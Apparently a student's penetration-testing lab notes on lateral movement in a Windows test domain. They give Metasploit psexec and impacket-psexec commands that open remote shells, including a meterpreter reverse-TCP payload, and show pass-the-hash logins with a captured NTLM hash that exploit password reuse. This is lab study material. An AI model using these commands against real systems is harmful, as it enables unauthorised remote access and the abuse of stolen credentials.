# Metasploit psexec

>[!Note] Disadvantage
>This module is very noicy and might be picked up by some IDS.

psexec info:
> This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload.
```msfconsole
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.11
set RHOSTS 10.0.0.19
set SMBDomain MARVEL.local
set SMBUser frank
set SMBPass Password1
```

If the "Automatic" target doesn't work, we can also try other targets ("Native upload" works best?):
![[Pasted image 20240313135401.png]]

Exploitation successful:
![[Pasted image 20240313135758.png]]

## Login with NTLM hash instead of password

Login as administrator:
```msfconsole
unset SMBDomain
set SMBUser administrator
```

Copy the administrator NTLM hash "aad3b4...:7facdc..." previously captured via ntlmrelay.
![[Pasted image 20240313145050.png]]
Note: The first hash is the NT hash, the second hash is the LM hash.

```msfconsole
set SMBPass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

>[!Note] Password reuse
> In our lab the user "administrator" uses the same password on THEPUNISHER as the user "administrator" does on SPIDERMAN.
> Thus, we can use the captured "administrator" NTLM hash on SPIDERMAN to also login as "administrator" on THEPUNISHER.

Exploit successful. We logged in as "administrator" on THEPUNISHER with the NTLM hash dumped from the SAM database on SPIDERMAN:
![[Pasted image 20240313152316.png]]
# impacket-psexec

Alternative to the metasploit module.
Get a shell as "frank" on THEPUNISHER (10.0.019):
```bash
impacket-psexec MARVEL/frank:'Password1'@10.0.0.19
```

We successfully got a shell:
![[Pasted image 20240313152723.png]]

Same thing but with NTLM hash (make sure to remove the domain name "MARVEL" or else it will fail):
```bash
impacket-psexec administrator@10.0.0.19 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

Success:
![[Pasted image 20240313165814.png]]

Alternative tools (in case impacket-psexec fails):
- impacket-wmiexec
- impacket-smbexec